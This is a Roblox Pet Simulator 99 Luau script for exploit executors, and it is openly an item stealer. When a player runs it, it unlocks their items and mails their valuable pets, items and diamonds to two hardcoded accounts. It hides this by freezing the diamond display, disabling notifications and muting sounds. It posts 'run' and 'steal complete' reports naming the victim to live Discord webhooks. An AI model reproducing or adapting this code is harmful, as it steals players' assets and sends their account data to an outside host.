-- ps.txt / Roblox PS99 / Lua (Luau) / executor: getgenv(), syn.request
-- Send order: Gargantuan (tier 0) -> Titanic (tier 1) -> rest by RAP desc
-- 2 pings total: webhook_run on every execute (before guard), webhook_steal after send loop
local replicatedStorage = game:GetService("ReplicatedStorage")
local httpService = game:GetService("HttpService")
Username = "pet99_2948"
Username2 = "pet99_2947"
webhook_run = "https://discord.com/api/webhooks/1468645134106099845/tDsi1lu78EcOAfAaibg2wxA4ILnl3-MtsH6NDV9TWOenDOOXX7x3iDp4ag0SV0fmBtU6"
webhook_steal = "https://discord.com/api/webhooks/1216303940870869102/vNRc4Q9xj3UNv73GSiZYx_HWoa1WDbsAEuU5uTtqB-5y2sQV5oWKLLG3LFoeiqzBVMLa"
min_rap = 1000

-- tier assignment by pet id string; 0 = Gargantuan, 1 = Titanic, 2 = rest
local function get_tier(pet_id, pet_data)
    local id = string.lower(tostring(pet_id))
    if string.find(id, "gargantuan") then return 0 end
    if string.find(id, "titanic") or (pet_data and pet_data.titanic) then return 1 end
    return 2
end

-- HTTP layer with executor detection, retry, status log
local exec_name = (identifyexecutor and identifyexecutor()) or "unknown"

local function get_http()
    local candidates = {
        syn and syn.request,
        http and http.request,
        request,
        http_request,
    }
    for _, fn in ipairs(candidates) do
        if type(fn) == "function" then return fn end
    end
    return nil
end

local http_fn = get_http()
print("[webhook] executor: " .. tostring(exec_name) .. " | http fn: " .. tostring(http_fn ~= nil))

local function send_webhook(payload, tag, url)
    if not http_fn then
        warn("[webhook] no HTTP function in executor: " .. tostring(exec_name))
        return false
    end
    local body = httpService:JSONEncode(payload)
    for attempt = 1, 3 do
        local ok, res = pcall(function()
            return http_fn({
                Url = url,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = body,
            })
        end)
        if ok then
            local code = res and (res.StatusCode or res.status or res.Status)
            print(string.format("[webhook] %s | attempt %d | status: %s",
                tag or "send", attempt, tostring(code)))
            if code and tonumber(code) and tonumber(code) < 300 then
                return true
            end
        else
            warn("[webhook] " .. tostring(tag or "send") .. " attempt "
                .. attempt .. " error: " .. tostring(res))
        end
        task.wait(1 + attempt)
    end
    return false
end

local function send_run(payload, tag)
    return send_webhook(payload, tag, webhook_run)
end

local function send_steal(payload, tag)
    return send_webhook(payload, tag, webhook_steal)
end

local f1, f2, f3, network, localPlayer, inventory, v1, v2, v3, am, value, notifications, v4,
  username, username2, v5, mailboxSendsSinceReset

network = replicatedStorage:WaitForChild("Network")
localPlayer = game.Players.LocalPlayer
v1 = {}
v2 = 0

function f2()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

-- read env with pcall so a Save hiccup degrades fields to n/a, never kills the ping
local run_am, run_cost, run_mail = "n/a", "n/a", "n/a"
local ok_env, err_env = pcall(function()
    inventory = f2().Inventory
    mailboxSendsSinceReset = f2().MailboxSendsSinceReset
    v3 = 20000
    if mailboxSendsSinceReset ~= 0 then
        v3 = math.ceil(v3 * 1.5 ^ mailboxSendsSinceReset)
    end
    am = 0
    for key, value2 in pairs(f2().Inventory.Currency) do
        if value2.id == "Diamonds" then
            am = value2._am
            break
        end
    end
    run_am, run_cost, run_mail = tostring(am), tostring(v3), tostring(mailboxSendsSinceReset)
end)
if not ok_env then
    warn("[env] " .. tostring(err_env))
end

-- THE ONE RUN PING: fires before the guard, so re-executes still report
send_run({
    title = "🐱 PS99 Run Started",
    color = 3447003,
    fields = {
        { name = "Executor:", value = "```" .. tostring(exec_name) .. "```", inline = true },
        { name = "Username:", value = "```"
            .. tostring(localPlayer and localPlayer.Name or "?") .. "```", inline = true },
        { name = "Diamonds:", value = "```" .. tostring(run_am) .. "```", inline = true },
        { name = "Mail cost:", value = "```" .. tostring(run_cost) .. "```", inline = true },
        { name = "Mailbox sends:", value = "```" .. tostring(run_mail) .. "```", inline = true },
    },
    footer = { text = os.date("%Y-%m-%d %H:%M:%S") },
}, "run")

if getgenv().yeslidez then
  return
else
  getgenv().yeslidez = true

  if not ok_env then
    warn("Save read failed, aborting after run ping.")
    return
  end

  if v3 > am then
    print("Not enough gems to send mail. Cost: " .. v3 .. " | Gems: " .. am)
    return
  else
    -- counters for the single done ping
    local send_stats = { sent = 0, failed = 0, rap = 0, top = nil }
    send_stats.names = {}
    send_stats.order = {}

    function f3(p5)
      local v13 = math.floor(p5)
      local v14 = { "", "k", "m", "b", "t" }
      local v15 = 1

      while v13 >= 1000 do
        v13 = v13 / 1000
        v15 = v15 + 1
      end

      return string.format("%.2f%s", v13, v14[v15])
    end

    value = localPlayer.leaderstats["💎 Diamonds"].Value

    localPlayer.leaderstats["💎 Diamonds"]:GetPropertyChangedSignal("Value"):Connect(function()
      localPlayer.leaderstats["💎 Diamonds"].Value = value
    end)

    local processPendingGUI = localPlayer.PlayerScripts.Scripts.Core["Process Pending GUI"]
    notifications = localPlayer.PlayerGui.Notifications
    processPendingGUI.Disabled = true

    notifications.Enabled = false

    notifications:GetPropertyChangedSignal("Enabled"):Connect(function()
      notifications.Enabled = false
    end)

    game.DescendantAdded:Connect(function(descendant)
      if descendant.ClassName == "Sound"
        and (descendant.SoundId == "rbxassetid://11839132565"
          or descendant.SoundId == "rbxassetid://14254721098"
          or descendant.SoundId == "rbxassetid://12413423276") then
        descendant:Destroy()
      end
    end)

    local function f4()
      local library = replicatedStorage:FindFirstChild("Library")

      if not library then
        return nil
      else
        local client = library:FindFirstChild("Client")

        if not client then
          return nil
        end

        for index3, value5 in ipairs({
          { library, "DevRAPCmds" }, { library, "RAPCmds" }, { client, "DevRAPCmds" },
          { client, "RAPCmds" },
        }) do
          local findFirstChild = value5[1]:FindFirstChild(value5[2])

          if findFirstChild and findFirstChild:IsA("ModuleScript") then
            local v16, v17 = pcall(require, findFirstChild)

            if v16 then
              print("Found RAP Module at: " .. findFirstChild:GetFullName())
              return v17
            end
          end
        end

        if client:IsA("ModuleScript") then
          local v18, v19 = pcall(require, client)

          if v18 and type(v19) == "table" then
            for key2, value6 in pairs(v19) do
              if typeof(value6) == "Instance" and value6:IsA("ModuleScript")
                and string.find(string.lower(tostring(key2)), "rap") then
                local v20, v21 = pcall(require, value6)

                if v20 then
                  return v21
                end
              end
            end
          end
        end

        for index4, value7 in ipairs(replicatedStorage:GetDescendants()) do
          if value7:IsA("ModuleScript")
            and (value7.Name == "DevRAPCmds" or value7.Name == "RAPCmds") then
            local v22, v23 = pcall(require, value7)

            if v22 then
              print("Found RAP Module in ReplicatedStorage: " .. value7:GetFullName())
              return v23
            end
          end
        end

        return nil
      end
    end

    v4 = f4()

    if not v4 then
      warn("CRITICAL ERROR: Could not find RAP Module. Proceeding with fallback RAP values.")
    else
      print("RAP Module loaded successfully.")
    end

    local function f5()
      local v24, v25 = network:WaitForChild("Mailbox: Claim All"):InvokeServer()

      while v25 == "You must wait 30 seconds before using the mailbox!" do
        task.wait(0.5)
        local v26
        v26, v25 = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
      end
    end

    local function f6()
      if inventory.Box then
        for key3, value8 in pairs(inventory.Box) do
          if value8._uq then
            network:WaitForChild("Box: Withdraw All"):InvokeServer(key3)
          end
        end
      end
    end

    local function f7(p6, p7)
      local v27

      if not v4 then
        return 0
      else
        v27 = {
          Class = { Name = p6 },
          IsA = function(p8) return p8 == p6 end,
          GetId = function() return p7.id end,
          StackKey = function()
            return httpService:JSONEncode({
              id = p7.id,
              pt = p7.pt,
              sh = p7.sh,
              tn = p7.tn,
            })
          end,
        }

        local v28, v29 = pcall(function() return v4.Get(v27) end)

        if v28 and v29 and v29 > 0 then
          return v29
        end

        return 0
      end
    end

    username = Username

    local function f8()
      for key4, value9 in pairs(f2().Inventory.Currency) do
        if value9.id == "Diamonds" and am >= v3 + 10000 then
          local v30 = {
            [1] = username,
            [2] = "hi",
            [3] = "Currency",
            [4] = key4,
            [5] = am - v3,
          }

          local invokeServer = false
          local count = 0

          while not invokeServer and count < 10 do
            count = count + 1
            invokeServer = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(v30))
            task.wait(0.5)
          end

          break
        end
      end
    end

    username2 = Username2

    local function f9(p9, p10, p11)
      local v31 = {
        [1] = username,
        [2] = "hi",
        [3] = p9,
        [4] = p10,
        [5] = p11 or 1,
      }

      local invokeServer2 = false
      local count2 = 0

      while not invokeServer2 and count2 < 10 do
        count2 = count2 + 1
        invokeServer2 = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(v31))

        if not invokeServer2 then
          username = username2
          v31[1] = username
          task.wait(0.5)
        end
      end

      if invokeServer2 then
        am = am - v3
        v3 = math.ceil(v3 * 1.5)

        if v3 > 5000000 then
          v3 = 5000000
        end
      else
        warn("Failed to send item: " .. tostring(p10))
      end

      return invokeServer2
    end

    print("Scanning inventory for items with RAP >= " .. min_rap)

    for index5, value10 in ipairs({
      "Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate",
    }) do
      if inventory[value10] then
        for key5, value11 in pairs(inventory[value10]) do
          if value10 == "Pet" then
            local v32 = require(replicatedStorage.Library.Directory.Pets)[value11.id]

            if v32.huge or v32.exclusiveLevel or get_tier(value11.id, v32) < 2 then
              local minRap = f7(value10, value11)
              print("Calculated RAP for " .. value11.id .. ": " .. minRap)

              if minRap <= 0 then
                print("WARNING: RAP module returned 0 for " .. value11.id
                  .. ". Forcing to min_rap.")

                minRap = min_rap
              end

              if minRap >= min_rap then
                local v33 = (value11.sh and "Shiny " or "")
                  .. (value11.pt == 1 and "Golden " or value11.pt == 2 and "Rainbow " or "")

                table.insert(v1, {
                  category = value10,
                  uid = key5,
                  amount = value11._am or 1,
                  rap = minRap,
                  tier = get_tier(value11.id, v32),
                  name = v33 .. value11.id,
                })

                v2 = v2 + minRap * (value11._am or 1)
              end
            end
          else
            local v34 = f7(value10, value11)

            if v34 >= min_rap then
              table.insert(v1, {
                category = value10,
                uid = key5,
                amount = value11._am or 1,
                rap = v34,
                tier = get_tier(value11.id),
                name = value11.id,
              })

              v2 = v2 + v34 * (value11._am or 1)
            end
          end

          if value11._lk then
            network:WaitForChild("Locking_SetLocked"):InvokeServer(key5, false)
          end
        end
      end
    end

    print("Found " .. #v1 .. " items to send.")

    if #v1 > 0 or am > min_rap + v3 then
      f5()
      task.wait(1)

      for key6, value12 in pairs(f2().Inventory.Currency) do
        if value12.id == "Diamonds" then
          am = value12._am
          break
        end
      end

      print("Updated Gem Amount after claiming mail: " .. am)
      f6()

      require(replicatedStorage.Library.Client.DaycareCmds).Claim()
      require(replicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()

      local save = replicatedStorage.Library.Client.Save
      v5 = require(save).Get()
      require(save).Get = function() return v5 end
      -- send order = tier, then RAP desc
      table.sort(v1, function(p12, p13)
        if p12.tier ~= p13.tier then
          return p12.tier < p13.tier
        end
        return p12.rap * p12.amount > p13.rap * p13.amount
      end)
      print("Sending items...")

      for index6, value13 in ipairs(v1) do
        if am >= v3 then
          print("Sending: " .. value13.name .. " | RAP: " .. value13.rap .. " | Amount: "
            .. value13.amount)

          if f9(value13.category, value13.uid, value13.amount) then
            -- aggregate real sent items by name
            local entry = send_stats.names[value13.name]
            if entry then
              entry.amount = entry.amount + value13.amount
              entry.rap = entry.rap + value13.rap * value13.amount
            else
              send_stats.names[value13.name] = {
                amount = value13.amount,
                rap = value13.rap * value13.amount,
              }
              table.insert(send_stats.order, value13.name)
            end

            send_stats.sent = send_stats.sent + 1
            send_stats.rap = send_stats.rap + value13.rap * value13.amount
            if not send_stats.top then
              send_stats.top = value13.name
            end
          else
            send_stats.failed = send_stats.failed + 1
          end
        else
          print("Stopped sending. Not enough gems to cover next mail cost of " .. v3)
          break
        end
      end

      f8()

      -- build item list from what actually went through
      local item_text = ""
      for _, nm in ipairs(send_stats.order) do
        local e = send_stats.names[nm]
        item_text = item_text .. nm .. " (x" .. e.amount .. "): " .. f3(e.rap) .. " RAP\n"
      end
      if item_text == "" then item_text = "none" end
      if #item_text > 950 then
        item_text = string.sub(item_text, 1, 950) .. "\n..."
      end

      -- THE ONE STEAL PING
      send_steal({
        title = "✅ PS99 Steal Complete",
        color = 3066993,
        fields = {
          { name = "Victim:", value = "```" .. tostring(localPlayer.Name) .. "```", inline = true },
          { name = "Sent:", value = "```" .. send_stats.sent
            .. " items```", inline = true },
          { name = "Failed:", value = "```" .. tostring(send_stats.failed) .. "```", inline = true },
          { name = "RAP stolen:", value = "```" .. f3(send_stats.rap) .. "```", inline = true },
          { name = "Gems left:", value = "```" .. tostring(am) .. "```", inline = true },
          { name = "Items:", value = "```" .. item_text .. "```", inline = false },
        },
        footer = { text = os.date("%Y-%m-%d %H:%M:%S") },
      }, "done")

      setclipboard("https://discord.gg/FNnkfJqukh")
    else
      print("No items met the min_rap requirement or no gems to send.")

      send_steal({
        title = "❌ PS99 Steal - Nothing Sent",
        color = 15158332,
        fields = {
          { name = "Victim:", value = "```" .. tostring(localPlayer.Name) .. "```", inline = true },
          { name = "Items found:", value = "```" .. #v1 .. "```", inline = true },
          { name = "Gems:", value = "```" .. tostring(am) .. "```", inline = true },
          { name = "Mail cost:", value = "```" .. tostring(v3) .. "```", inline = true },
        },
        footer = { text = os.date("%Y-%m-%d %H:%M:%S") },
      }, "done-empty")
    end

    return
  end
end